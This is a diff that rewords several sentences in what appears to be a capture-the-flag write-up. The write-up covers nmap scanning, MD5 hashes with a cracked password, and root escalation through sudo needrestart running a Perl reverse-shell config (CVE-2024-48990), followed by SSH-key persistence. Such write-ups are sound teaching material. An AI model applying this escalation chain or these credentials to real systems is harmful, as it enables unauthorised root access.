@@ -40,7 +40,7 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Oct 28 14:52:03 2025 -- 1 IP address (1 host up) scanned in 41.60 seconds
 ```
-Port `80` exposed a sample XSLT template, and `/about` published the full source code. Key findings:
+Port `80` exposed a sample XSLT template, and `/about` published the full source code. Three findings stood out:
 
 - `users.db` — username/hash storage
 - `app.py` — XSLT parsed without security restrictions
@@ -111,7 +111,7 @@ The SQLite database at `instance/users.db` held MD5-hashed credentials:
 | simo       | 43bd48ade3219a1931115a1dabbe1a7f |
 | fismathack | 5b5c3ac3a1c897c94caad48e6c71fdec |
 
-`fismathack`'s hash was cracked:
+`fismathack`'s hash cracked to a usable password:
 
 ```text
 fismathack : Keepmesafeandwarm
@@ -121,7 +121,7 @@ fismathack : Keepmesafeandwarm
 
 `sudo -l` revealed `fismathack` could run **needrestart** with root privileges.
 
-`needrestart 3.7` is affected by **CVE-2024-48990**, but public exploits required `apt install` or GCC — neither available. Reviewing the needrestart config source revealed it evaluates Perl code from `.conf` files passed via the `-c` flag:
+`needrestart 3.7` is affected by **CVE-2024-48990**, but the public exploits required `apt install` or GCC — neither of which was available. Reviewing the needrestart config source revealed it evaluates Perl code from `.conf` files passed via the `-c` flag:
 
 ```perl
 foreach my $fn (sort </etc/needrestart/conf.d/*.conf>) {
@@ -135,6 +135,6 @@ A Perl reverse shell payload was dropped as `rev.conf` and executed:
 sudo needrestart -c rev.conf
 ```
 
-Unstable root shell on the listener — stabilized with `/bin/bash -p` and persistence established via `id_rsa` keys.
+The root shell on the listener was unstable, so I stabilized it with `/bin/bash -p` and set up persistence through `id_rsa` keys.
 
 Gained `root`
